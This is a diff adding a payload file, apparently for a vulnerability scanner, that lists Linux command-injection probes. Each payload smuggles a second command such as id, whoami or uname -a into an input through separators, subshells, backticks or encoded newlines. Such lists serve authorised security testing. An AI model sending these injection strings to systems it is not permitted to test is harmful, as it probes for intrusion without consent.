@@ -1,0 +1,48 @@
+# @default_os:     linux
+# @default_signal: system:linux_id
+# @default_blind:  false
+# @default_tier:   1
+#
+# Extended Linux direct-output payloads.
+# Add one payload per line. Use @label/@signal/@blind/@os to annotate blocks.
+# Lines beginning with # are ignored.
+
+# @label: Semicolon id (extended)
+# @signal: system:linux_id
+;id
+
+# @label: OR-separator id
+# @signal: system:linux_id
+||id
+
+# @label: Pipe id no space
+# @signal: system:linux_id
+|id
+
+# @label: Subshell id
+# @signal: system:linux_id
+$(id)
+
+# @label: Backtick id
+# @signal: system:linux_id
+`id`
+
+# @label: Semicolon whoami
+# @signal: system:linux_user
+;whoami
+
+# @label: Subshell whoami
+# @signal: system:linux_user
+$(whoami)
+
+# @label: Uname kernel
+# @signal: system:linux_uname
+;uname -a
+
+# @label: Newline id
+# @signal: system:linux_id
+%0aid
+
+# @label: CRLF id
+# @signal: system:linux_id
+%0d%0aid
